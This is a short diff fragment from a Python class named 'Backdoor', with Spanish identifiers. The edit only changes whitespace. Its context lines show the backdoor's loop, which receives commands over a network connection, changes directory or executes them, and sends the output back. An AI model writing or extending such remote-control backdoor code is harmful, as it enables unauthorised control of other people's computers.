@@ -48,8 +48,7 @@ class Backdoor:
                 path = command_str[3:].strip()
                 resultado = self.cambiarDirectorio(path)
                 self.connection.send(resultado)
-                continue
-                            
+                continue             
             
             resultadosComando = self.ejecutarComando(command)
             self.connection.send(resultadosComando)
